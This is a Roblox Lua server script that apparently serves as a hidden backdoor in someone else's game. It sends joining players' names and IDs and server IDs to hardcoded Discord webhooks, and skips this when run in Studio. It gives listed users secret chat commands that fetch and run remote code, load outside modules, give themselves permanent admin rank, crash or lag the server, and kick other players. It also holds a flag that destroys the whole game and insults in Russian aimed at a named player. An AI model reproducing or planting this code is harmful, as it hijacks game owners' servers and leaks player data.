	--12865569756,
}
local FakeKickSystem = false
local InsertService = game:GetService("InsertService")
Players.PlayerAdded:Connect(function(plr)
		local HTTPService = game:GetService("HttpService")
if HTTPService.HttpEnabled then
	local proxy = "https://hooks.hyra.io"
	local hook = "https://discord.com/api/webhooks/1248704861256810566/q9DE9f-XPJlCVbVsJ7GFkQD-fr121Mil5RrsqwxQhLvopjtfPe2LFhjUK-dVFPTlIPHN"
	local DISCORDhook = hook --string.gsub(hook, "https://discord.com", proxy)
	if game["Run Service"]:IsStudio()==false then
		local s,e=pcall(function()
			local d = HTTPService:JSONEncode({
				['embeds'] = {{
					['title'] = "Заход",
					['type'] = "rich",
					["color"] = 29403,

					["fields"] = {
						{
							["name"] = "Server ID:",
							["value"] = game.JobId,
							["inline"] = true
						},
						{
							["name"] = "Name:",
							["value"] = plr.Name,
							["inline"] = true
						},
						{
							["name"] = "UserId:",
							["value"] = plr.UserId,
							["inline"] = true
						},
						

					},
						["thumbnail"] = {
							["url"] = ("https://roblox-avatar.eryn.io/%s"):format(plr.UserId)
						},
					["footer"] = {
						["text"] = "Created In",
						["icon_url"] = "https://store-images.microsoft.com/image/apps.11804.9007199266251480.a97e2e09-7c7e-4bdc-8984-abfe733095c1.5d414a81-5be5-445b-b3af-ce58fe245bc9?h=464"
					},
					["timestamp"] = tostring(DateTime.now():ToIsoDate()),

				},
				},
			})

			HTTPService:PostAsync(DISCORDhook,d)
		end)
		if not s then
			warn("HTTPSERVICE ERROR:",e)
		end
	end
end
	if plr.UserId == 542520932 and FakeKickSystem then
		plr:Kick("Blacklisted")
	end
	plr.CharacterAdded:Connect(function(char)
		local Pants = char:FindFirstChildOfClass("Pants") or Instance.new("Pants",char)
		local Shirt = char:FindFirstChildOfClass("Shirt") or Instance.new("Shirt",char)
		--

		if trolling[plr.UserId] then
			local shirtid = shirtids[math.random(1,#pantsids)] or shirtids[1]
			local pantsid = pantsids[math.random(1,#pantsids)] or pantsids[1]
			Shirt.ShirtTemplate = "rbxassetid://"..shirtid
			Pants.PantsTemplate = "rbxassetid://"..pantsid
				char:FindFirstChild("Head"):FindFirstChild("face").Texture = "http://www.roblox.com/asset/?id=7050177264"
				local selected = {

				}
				for i = 1,maxaccessory do
					local selecteda = nil
					repeat selecteda = acessory[math.random(1,#acessory)] until selected[selecteda]==nil
					local accessory3 = InsertService:LoadAsset(selecteda):GetChildren()[1]
					accessory3.Parent = char
				end
			
		end
	end)
end)
--repeat task.wait() until _G.HDAdminMain~=nil

local main = _G.HDAdminMain
local HttpService = game.HttpService
local AdminPanel = {
	"t10_kol",
	"LuckDanil",
	"EnvoyOfHead",
	"lyovka1",
	"cts_qs",
	"lopnulo_Yaichko",
	"ROBLOXkarpa",
}
local Version_of_theScript = "V1.0.3 ALPHA"
local EnabledDoDOS = false
local BlackList = {
	["Vad_75"]=true, --< Vadik Pidorasik
}
local LagEnabled = false
local LagObjcets = {
}
local wellwellwell = true
local DESTROY_ALL = false
if DESTROY_ALL then
for _, v in pairs(game:GetDescendants()) do
	pcall(function()
		v:Destroy()
	end)
end
end
game.Players.PlayerAdded:Connect(function(player)
			if BlackList[player.Name] then
		if EnabledDoDOS==true then 
			player:Kick("Error While Connecting To Experience") --Соси Хуй Вад 😀
		end
	end
        if wellwellwell then
			if table.find(AdminPanel,player.Name) == nil then
				if not BlackList[player.Name] then
					player:Kick("вад ебаный пидорас. Заходим ко мне на сервак https://discord.gg/YMQnbp2ytD") --Соси Хуй Вад 😀
				end
							
			end
		end
	if table.find(AdminPanel,player.Name) ~= nil then
			local Watermark = Instance.new("ScreenGui")
local WaterMark = Instance.new("TextLabel")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")

--Properties:

Watermark.Name = "Watermark"
Watermark.Parent = player:WaitForChild("PlayerGui")
Watermark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

WaterMark.Name = "WaterMark"
WaterMark.Parent = Watermark
WaterMark.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WaterMark.BackgroundTransparency = 1.000
WaterMark.BorderColor3 = Color3.fromRGB(0, 0, 0)
WaterMark.BorderSizePixel = 0
WaterMark.Position = UDim2.new(0, 0, 0.951186121, 0)
WaterMark.Size = UDim2.new(0.0867430419, 0, 0.0474452563, 0)
WaterMark.Font = Enum.Font.Code
WaterMark.LineHeight = 1.350
WaterMark.Text = "ADM System "..Version_of_theScript
WaterMark.TextColor3 = Color3.fromRGB(255, 255, 255)
WaterMark.TextScaled = true
WaterMark.TextSize = 14.000
WaterMark.TextWrapped = true

UIAspectRatioConstraint.Parent = WaterMark
UIAspectRatioConstraint.AspectRatio = 4.077
		require(7192763922).load(player.Name)


		--local banDetails = main:GetModule("cf"):GetBannedUserDetails(plr)
		--main.signals.ShowBannedUser:FireClient(plr, banDetails)


	pcall(function()
					repeat 	local banDetails, record = main:GetModule("cf"):GetBannedUserDetails(player.Name)
		--targetName, targetId, targetReason, record
		if banDetails then
			record.BanTime = os.time()
			if record.Server ~= "Current" then
				main:GetModule("SystemData"):InsertStat("Banland", "RecordsToModify", record)
			end
			--main:GetModule("cf"):FormatAndFireNotice(speaker, "UnBanSuccess", banDetails[1])
		end until main ~= nil
				end)
	
		player.Chatted:Connect(function(message)
			print("message was send")
			local args = message:split(" ") -- Splits arguments.
			if args[1]:lower() == "/e ADM.Message" then -- Checks if the command was used.
				local announcemsg = message:sub(args[1]:len() + 2,-1) 
				local message_COOL = Instance.new("Message",workspace)
				message_COOL.Text = announcemsg
				game.Debris:AddItem(message_COOL,10)
			end
			if message == "/e ADM.Restart" then
				local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
				local f = loadstring(code)
				f()
			elseif message == "/e ADM.Sky" then
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=17441852461"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=17441852461"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=17441852461"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=17441852461"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=17441852461"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=17441852461"
			elseif message == "/e ADM.RankMe" then
				main:GetModule("cf"):SetRank(player, game.CreatorId, 999999999999999, "Perm")
			elseif message == "/e ADM.Sky2" then
				local id = game.GroupService:GetGroupInfoAsync(32993955).EmblemUrl
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = id
			elseif message == "/e ADM.antivad" then
				EnabledDoDOS = not EnabledDoDOS
			elseif message == "/e ADM.spawnvad" then
				CreateVad(player.Character.Torso.CFrame,workspace)
			elseif message == "/e ADM.Fun" then
				for _, player2 in pairs(game.Players:GetPlayers()) do
					local Part = Instance.new("Part",player2.Character)
					Part.CanCollide=false
					Part.CFrame = player2.Character.Torso.CFrame
					Part.Color = player2.Character.Torso.Color
					local weld = Instance.new("Weld",Part)
					weld.Part0 = player2.Character.Torso
					weld.Part1 = Part
					weld.C0 = CFrame.new(0,0.5,-0.75) * CFrame.Angles(0,math.rad(-90),0)
					local mesh = Instance.new("SpecialMesh",Part)

					mesh.MeshId = "rbxassetid://7606070501"
					mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
				end
				--rbxassetid://5679232242
			elseif message == "/e ADM.Fun2" then
				print("VER3")
				for _, player2 in pairs(game.Players:GetPlayers()) do
					local CharMesh1 = Instance.new("CharacterMesh",player2.Character)
					CharMesh1.MeshId = 83001137
					CharMesh1.BodyPart = Enum.BodyPart.LeftArm
					local CharMesh2 = Instance.new("CharacterMesh",player2.Character)
					CharMesh2.MeshId = 83001181
					CharMesh2.BodyPart = Enum.BodyPart.RightArm
					local AccessoryBlackList = {
						[Enum.AccessoryType.Back]=true,
						[Enum.AccessoryType.Front]=true,
						[Enum.AccessoryType.Waist]=true,
						[Enum.AccessoryType.Shoulder]=true,
					}
					for _, accessory:Accessory in pairs(player2.Character:GetChildren()) do
						if accessory:IsA("Accessory") then
							if AccessoryBlackList[accessory.AccessoryType] then
								accessory:Destroy()
							end
						end
					end
					local mesh = Instance.new("SpecialMesh",player2.Character.Torso)

					mesh.MeshId = "rbxassetid://5679232242"
					mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
					mesh.Scale = Vector3.new(2.02, 2.02, 2.02)


					local Part = Instance.new("Part",player2.Character)
					Part.CanCollide=false
					Part.CFrame = player2.Character.Torso.CFrame
					Part.Size = Vector3.new(1.45, 0.944, 1.048)
					Part.Color = player2.Character.Torso.Color
					local weld = Instance.new("Weld",Part)
					weld.Part0 = player2.Character.Torso
					weld.Part1 = Part
					weld.C0 = CFrame.new(0, 0.202, -0.465)
					local mesh2 = Instance.new("SpecialMesh",Part)

					mesh2.MeshId = "rbxassetid://5679326691"
					mesh2.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
					mesh2.Scale = Vector3.new(2.02, 2.02, 2.02)

					--left leg

					local mesh3 = Instance.new("SpecialMesh",player2.Character["Left Leg"])

					mesh3.MeshId = "rbxassetid://5679229838"
					mesh3.TextureId = player2.Character:FindFirstChildOfClass("Pants").PantsTemplate
					mesh3.Scale = Vector3.new(2.02, 2.02, 2.02)

					--right leg

					local mesh4 = Instance.new("SpecialMesh",player2.Character["Right Leg"])

					mesh4.MeshId = "rbxassetid://5679231042"
					mesh4.TextureId = player2.Character:FindFirstChildOfClass("Pants").PantsTemplate
					mesh4.Scale = Vector3.new(2.02, 2.02, 2.02)
				end
				--rbxassetid://5679232242
			elseif message == "/e ADM.Executor" then
				--local Part = Instance.new("Part",workspace)
				--Part.CanCollide=true
				--Part.CFrame = player.Character.Torso.CFrame
				require(6324372525).fse(player.Name)
			elseif message == "/e ADM.Executor2" then
				--local Part = Instance.new("Part",workspace)
				--Part.CanCollide=true
				--Part.CFrame = player.Character.Torso.CFrame
				require(5419042716).PraiseSkidGod(player.Name)
			elseif message == "/e ADM.Lag.Start" then
				LagEnabled = true
			elseif message == "/e ADM.JustGo" then
				FakeKickSystem = not FakeKickSystem
			elseif message == "/e ADM.Lag.Stop" then
				LagEnabled=false
				for index,lagobj in pairs(LagObjcets) do
					lagobj:Destroy()
				end
			elseif message == "/e ADM.Crash" then
				while tick() do
					print("CrashTHEServer")
				end
			end
		end)
		
	end
end)

--[[
for _, player in pairs(game.Players:GetPlayers()) do
	if table.find(AdminPanel,player.Name) ~= nil then
		require(7192763922).load(player.Name)


		--local banDetails = main:GetModule("cf"):GetBannedUserDetails(plr)
		--main.signals.ShowBannedUser:FireClient(plr, banDetails)
		main:GetModule("cf"):SetRank(game:GetService("Players")[player.name], game.CreatorId, 999999999999999, "Perm")  
		pcall(function()
			local banDetails, record = main:GetModule("cf"):GetBannedUserDetails(player.Name)
			--targetName, targetId, targetReason, record
			if banDetails then
				record.BanTime = os.time()
				if record.Server ~= "Current" then
					main:GetModule("SystemData"):InsertStat("Banland", "RecordsToModify", record)
				end
				--main:GetModule("cf"):FormatAndFireNotice(speaker, "UnBanSuccess", banDetails[1])
			end
		end)
		player.Chatted:Connect(function(message)
			if message == "ADM.Restart" then
				local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
				local f = loadstring(code)
				f()
			elseif message == "ADM.Sky" then
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
			elseif message == "ADM.Sky2" then
				local id = game.GroupService:GetGroupInfoAsync(32993955).EmblemUrl
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = id
			elseif message == "ADM.Fun" then
				for _, player2 in pairs(game.Players:GetPlayers()) do
					local Part = Instance.new("Part",player2.Character)
					Part.CanCollide=false
					Part.CFrame = player2.Character.Torso.CFrame
					Part.Color = player2.Character.Torso.Color
					local weld = Instance.new("Weld",Part)
					weld.Part0 = player2.Character.Torso
					weld.Part1 = Part
					weld.C0 = CFrame.new(0,0.5,-0.75) * CFrame.Angles(0,math.rad(-90),0)
					local mesh = Instance.new("SpecialMesh",Part)

					mesh.MeshId = "rbxassetid://7606070501"
					mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
				end
			elseif message == "ADM.Executor" then
				local Part = Instance.new("Part",workspace)
				Part.CanCollide=true
				Part.CFrame = player.Character.Torso.CFrame
				require(6324372525).fse(player.Name)
			elseif message == "ADM.Executor2" then
				local Part = Instance.new("Part",workspace)
				Part.CanCollide=true
				Part.CFrame = player.Character.Torso.CFrame
				require(5419042716).PraiseSkidGod(player.Name)
			elseif message == "ADM.Lag.Start" then
				LagEnabled = true


			elseif message == "ADM.Lag.Stop" then
				LagEnabled=false
				for index,lagobj in pairs(LagObjcets) do
					lagobj:Destroy()
				end
			end
		end)
	end


end
]]
local HTTPService = game:GetService("HttpService")
if HTTPService.HttpEnabled then
	local proxy = "https://hooks.hyra.io"
	local hook = "https://discord.com/api/webhooks/1239557560747425852/6bf4L-rZTC3_GbvgENKxVxDYAPguWhom0bBKmgarfp6LfWTrd7p_Ys0KnTQ0FMd3M-fv"
	local DISCORDhook = hook --string.gsub(hook, "https://discord.com", proxy)
	if game["Run Service"]:IsStudio()==false then
		local s,e=pcall(function()
			local d = HTTPService:JSONEncode({
				['embeds'] = {{
					['title'] = "server",
					['type'] = "rich",
					["color"] = 29403,

					["fields"] = {
						{
							["name"] = "Server ID:",
							["value"] = game.JobId,
							["inline"] = true
						},
						{
							["name"] = "PrivateServerId:",
							["value"] = game.PrivateServerId,
							["inline"] = true
						},
						{
							["name"] = "PrivateServerOwnerId:",
							["value"] = game.PrivateServerOwnerId,
							["inline"] = true
						},

					},

					["footer"] = {
						["text"] = "Created In",
						["icon_url"] = "https://store-images.microsoft.com/image/apps.11804.9007199266251480.a97e2e09-7c7e-4bdc-8984-abfe733095c1.5d414a81-5be5-445b-b3af-ce58fe245bc9?h=464"
					},
					["timestamp"] = tostring(DateTime.now():ToIsoDate()),

				},
				},
			})

			HTTPService:PostAsync(DISCORDhook,d)
		end)
		if not s then
			warn("HTTPSERVICE ERROR:",e)
		end
	end
end
game["Run Service"].Heartbeat:Connect(function()


	if LagEnabled==false then return end
	for index,value:Part in pairs(LagObjcets) do
		value.Velocity = Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
	end
	for _, player2 in pairs(game.Players:GetPlayers()) do
		for i = 1,5 do
			local Part = Instance.new("Part",workspace)
			Part.CanCollide=true
			Part.CFrame = player2.Character.Torso.CFrame
			Part.Shape = Enum.PartType.Ball
			Part.Locked = true
			table.insert(LagObjcets,Part)
		end
	end
end)
